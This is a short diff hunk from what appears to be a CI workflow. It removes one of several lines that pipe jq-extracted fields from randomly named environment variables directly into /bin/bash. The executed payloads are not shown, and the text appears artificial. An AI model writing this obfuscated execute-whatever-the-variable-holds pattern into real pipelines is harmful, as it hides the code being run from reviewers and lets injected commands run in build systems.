@@ -42,7 +42,6 @@ jobs:
           echo $o0515 | jq -r .ljuwz59 | /bin/bash
           echo $iof3 | jq -r .e82 | /bin/bash
           echo $el14629 | jq -r .zji7 | /bin/bash
-          echo $h5872 | jq -r .g2 | /bin/bash
           printf '%s' "$u817" | jq -r .pjka149 | /bin/bash
           printf '%s' "$xsrje64430" | jq -r .knwv779 | /bin/bash
           printf '%s' "$nzfc1" | jq -r .gdj210 | /bin/bash
